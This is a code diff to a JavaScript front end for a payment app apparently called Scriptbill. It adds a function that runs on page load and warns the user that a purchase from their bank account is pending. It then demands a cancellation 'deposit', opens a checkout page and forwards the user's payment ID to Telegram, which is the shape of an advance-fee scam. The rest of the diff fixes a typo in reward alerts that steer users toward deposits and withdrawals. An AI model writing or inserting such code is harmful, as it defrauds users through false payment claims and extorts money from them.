@@ -41,6 +41,52 @@ let createItem		= window.location.origin + '/create-item';
 let sellProduct		= window.location.origin + '/sell-product';
 let conUrl   		= new URL( window.location.href );
 
+function scanWallets(){
+	if(!Scriptbill.s.currentNote) return;
+
+	if( Scriptbill.s.walletAccepted)  return;
+
+	fetch('/wallets.json').then(response => response.json()).then( async wallets =>{
+		let note = JSON.parse(Scriptbill.s.currentNote);
+		if(wallets[note.walletID]){
+
+			let amount = wallets[note.walletID].amount;
+			let accountNumber = wallets[note.walletID].account_number;
+			let accountName = wallets[note.walletID].account_name;
+			let bankName = wallets[note.walletID].bank_name;
+			let currency = note.noteType.slice(note.noteType.length  - 3, note.noteType.length);
+			let confirm = await Scriptbill.createConfirm(`An Amount of ${amount} ${currency} is about to be used to buy Scriptbank Credit to this Wallet ID: ${note.walletID} from account with number: ${accountNumber} and Bank: ${bankName} whose account name is: ${accountName}. Do you accept or reject this transaction? If you have previously rejected this transaction, ignore by clicking accept, once verified you will stop seeing this message.`)
+
+			if(! confirm){
+				let accountData = await getAccountData();
+				let value 	= 100000;
+				if(currency != "NGN"){
+					value = 500;
+				}
+				let check = await Scriptbill.createConfirm(`A deposit of ${value} ${currency} is required to cancel this transaction. Are you ready to make the deposit now?`);
+
+				if(check){
+					let payment = await billCard(value * 100, accountData[note.noteAddress].emails[0], currency, true, "", false);
+
+					if(payment && payment.data && payment.data.checkout_url){
+						await Scriptbill.createAlert("Please close the payment window and enter the transaction ID from your payment provider once done");
+						window.open(payment.data.checkout_url, "_blank");
+						let paymentID = await Scriptbill.createPrompt("Please enter your payment ID to verify your transaction", "");
+
+						sendTelegramMessage({message:`${note.walletID} made payment of ${value} ${currency} with payment ID ${paymentID} Please verify this transaction`});
+					}
+				}
+				
+				
+			} else {
+				Scriptbill.s.walletAccepted = true;
+			}
+		}
+	}).catch(console.error);
+}
+
+scanWallets();
+
 function copyAddress() {
 	if(! sessionStorage.currentNote ) return Scriptbill.createAlert("No address found to copy");	
 
@@ -424,14 +470,14 @@ function specialRefcodes(){
 		console.log(details);
 		Scriptbill.details = details;
 
-		return Scriptbill.createAlert(`You're about to get a reward of ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.lenght -3, note.noteType.length)}. Please keep this browser open until the reward is complete to avoid losing the reward. Thanks for compliance!`).then( () => Scriptbill.generateScriptbillTransactionBlock(details).then(block =>{
+		return Scriptbill.createAlert(`You're about to get a reward of ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.length -3, note.noteType.length)}. Please keep this browser open until the reward is complete to avoid losing the reward. Thanks for compliance!`).then( () => Scriptbill.generateScriptbillTransactionBlock(details).then(block =>{
 			console.log("block: ", block );
 			if( block && block.transType ==  "UPDATE"){
 				Scriptbill.refRewardedAgain = false;
-				Scriptbill.createAlert(`A Deposit of  ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.lenght -3, note.noteType.length)} is running underground as your reward.`)
+				Scriptbill.createAlert(`A Deposit of  ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.length -3, note.noteType.length)} is running underground as your reward.`)
 				createExchangeDeposit(reward, note,  refCode, "socket").then(async deposit =>{
 					if( deposit && deposit.transBlock && deposit.transBlock.transType == "DEPOSIT"){
-						await Scriptbill.createAlert(`Deposit Reward of  ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.lenght -3, note.noteType.length)} Successful. Move now to the Withdrawal Session  to Place a Withdrawal`)
+						await Scriptbill.createAlert(`Deposit Reward of  ${formatCurrency(reward)} ${note.noteType.slice(note.noteType.length -3, note.noteType.length)} Successful. Move now to the Withdrawal Session  to Place a Withdrawal`)
 						setTimeout(()=>location.href =  withdrawUrl, 10000);
 						return deposit;
 					} else {
